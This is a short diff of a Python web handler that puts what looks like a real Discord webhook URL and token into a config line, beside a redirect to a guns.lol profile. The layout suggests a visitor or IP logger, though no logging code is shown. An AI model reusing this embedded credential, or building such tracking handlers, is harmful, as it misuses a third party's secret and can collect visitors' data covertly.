@@ -3,7 +3,7 @@ import requests
 import json
 
 # 1. PASTE YOUR WEBHOOK URL INSIDE THE QUOTES
-WEBHOOK_URL = "YOUR_ACTUAL_WEBHOOK_URL_HERE"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1471709365064171624/1Do6JPAWJ-EQ5RipNP9bIGrX2lcTv0rdNs7O-Mi2iTYsS96UTiW9fL40Rd0CHpdpvitW"
 REDIRECT_URL = "https://guns.lol/sleezyyyyyy"
 
 class handler(BaseHTTPRequestHandler):
